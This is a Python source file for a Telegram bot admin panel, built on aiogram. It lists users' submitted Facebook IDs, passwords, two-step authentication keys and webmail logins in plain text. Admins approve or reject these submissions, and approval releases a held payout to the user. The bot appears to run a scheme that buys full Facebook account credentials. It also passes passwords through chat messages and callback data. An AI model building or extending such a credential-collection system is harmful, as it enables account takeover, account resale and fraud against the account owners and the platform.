from aiogram import Router, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from utils.config import ADMIN_IDS, LOGS_CHANNEL_ID, bot
from utils.database_csv import CSVDatabase
import logging

router = Router()
logger = logging.getLogger(__name__)

def build_main_admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 User Stats & Info", callback_data="admin_user_stats")],
        [InlineKeyboardButton(text="💳 Review Withdrawals", callback_data="admin_review_withdrawals")],
        [InlineKeyboardButton(text="📡 Ping Test", callback_data="admin_ping_test")]
    ])

@router.message(F.text == "/admin")
async def admin_entry(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return await message.reply("⛔ Unauthorized.")
    await message.reply("🔧 <b>Admin Panel</b>", reply_markup=build_main_admin_menu(), parse_mode="HTML")

@router.callback_query(F.data == "admin_review_withdrawals")
async def review_withdrawals(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return

    db = CSVDatabase()
    # Specify the withdrawals file path explicitly if needed
    db.withdrawals_file = "data/withdrawals.csv"
    withdrawals = db.get_all_withdrawals()

    if not withdrawals:
        await callback.message.answer("No withdrawals found.")
        await callback.answer()
        return

    # Send withdrawal details in batches (limit to avoid flood)
    batch_size = 5
    total = len(withdrawals)
    for i in range(0, total, batch_size):
        batch = withdrawals[i:i+batch_size]
        msg = "<b>Withdrawals:</b>\n\n"
        for item in batch:
            msg += (
                f"ID: <code>{item['id']}</code>\n"
                f"User ID: <code>{item['user_id']}</code>\n"
                f"Amount: ${item['amount']}\n"
                f"Wallet: {item['wallet']}\n"
                f"Method: {item['method']}\n"
                f"Status: {item['status']}\n"
                f"Timestamp: {item['timestamp']}\n\n"
            )
        await callback.message.answer(msg, parse_mode="HTML")

    await callback.answer()

@router.callback_query(F.data == "admin_ping_test")
async def ping_test(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return
    await callback.message.answer("✅ Bot is alive and responsive.")
    await callback.answer()

@router.callback_query(F.data == "admin_user_stats")
async def show_user_stats(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return

    db = CSVDatabase()
    total_users = db.get_total_users()
    total_regs = db.get_total_registrations()

    msg = (
        f"📊 <b>User and Registration Statistics</b>\n\n"
        f"👥 Total unique users: <b>{total_users}</b>\n"
        f"📝 Total registration entries: <b>{total_regs}</b>\n\n"
        "Click below to view all registered user details."
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 View All Registrations FB", callback_data="admin_view_all_registrations")],
        [InlineKeyboardButton(text="⬅️ Back to Admin Menu", callback_data="admin_back_main")]
    ])

    await callback.message.edit_text(msg, reply_markup=kb, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data == "admin_view_all_registrations")
async def show_all_registrations(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return

    db = CSVDatabase()
    all_regs = db.get_all_registration_details()

    if not all_regs:
        await callback.message.edit_text("❌ No registration data found.")
        return

    chunk_size = 5
    total = len(all_regs)
    for i in range(0, total, chunk_size):
        chunk = all_regs[i:i + chunk_size]
        msg = "👥 <b>Registered User Details:</b>\n\n"
        for idx, (user_id, data) in enumerate(chunk, start=i + 1):
            msg += (
                f"<b>{idx}.</b> User ID: <code>{user_id}</code>\n"
                f"👤 Facebook ID: <code>{data.get('facebook_id', 'N/A')}</code>\n"
                f"🔑 Password: <code>{data.get('password', 'N/A')}</code>\n"
                f"🔐 Two-Step Key: <code>{data.get('two_step_key', 'N/A')}</code>\n"
                f"📧 Webmail: <code>{data.get('webmail', 'N/A')}</code>\n\n"
                f"🔘 Approve: <code>admin_approve_{user_id}_{data.get('password')}</code>\n"
                f"✖️ Reject: <code>admin_reject_{user_id}_{data.get('password')}</code>\n\n"
            )
        await callback.message.answer(msg, parse_mode="HTML")
    await callback.answer()

@router.callback_query(F.data == "admin_back_main")
async def back_to_admin_menu(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return

    await callback.message.edit_text(
        "🔧 <b>Admin Panel</b>",
        reply_markup=build_main_admin_menu(),
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("admin_approve_"))
async def handle_admin_approve(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return

    try:
        payload = callback.data[len("admin_approve_"):]
        user_id_str, password = payload.split("_", 1)
        user_id = int(user_id_str)
    except Exception:
        await callback.answer("Invalid callback data format.", show_alert=True)
        return

    db = CSVDatabase()
    all_regs = db._read_all_registrations()
    reg = next((r for r in all_regs if r["user_id"] == str(user_id) and r["data"].get("password") == password), None)

    if not reg:
        await callback.answer("Registration data not found.", show_alert=True)
        return

    facebook_id = reg["data"].get("facebook_id")
    if not facebook_id:
        await callback.answer("Facebook ID not found in registration.", show_alert=True)
        return

    moved_amount = db.move_hold_to_main_for_facebook_id(user_id, facebook_id)
    if moved_amount <= 0:
        await callback.answer("No hold balance found for this Facebook ID.", show_alert=True)
        return

    if not db.approve_registration(user_id, password, True):
        await callback.answer("Failed to update approval status.", show_alert=True)
        return

    await callback.message.edit_text(
        f"✅ Approved Facebook ID <code>{facebook_id}</code> for user <code>{user_id}</code>.\n"
        f"💰 Moved ${moved_amount:.2f} from hold to main balance.",
        parse_mode="HTML"
    )
    await callback.answer()

@router.callback_query(F.data.startswith("admin_reject_"))
async def handle_admin_reject(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Unauthorized.", show_alert=True)
        return

    try:
        payload = callback.data[len("admin_reject_"):]
        user_id_str, password = payload.split("_", 1)
        user_id = int(user_id_str)
    except Exception:
        await callback.answer("Invalid callback data format.", show_alert=True)
        return

    db = CSVDatabase()
    all_regs = db._read_all_registrations()
    reg = next((r for r in all_regs if r["user_id"] == str(user_id) and r["data"].get("password") == password), None)

    facebook_id = reg["data"].get("facebook_id") if reg else None
    if not facebook_id:
        await callback.answer("Facebook ID not found in registration.", show_alert=True)
        return

    if db.reject_registration(user_id, password):
        db.remove_hold_balance_for_facebook_id(user_id, facebook_id)
        await callback.message.edit_text(
            f"❌ Rejected registration for Facebook ID <code>{facebook_id}</code>.\n"
            "Hold balance cleared for this ID.",
            parse_mode="HTML"
        )
    else:
        await callback.message.edit_text("⚠️ Failed to reject and delete registration.")
    await callback.answer()
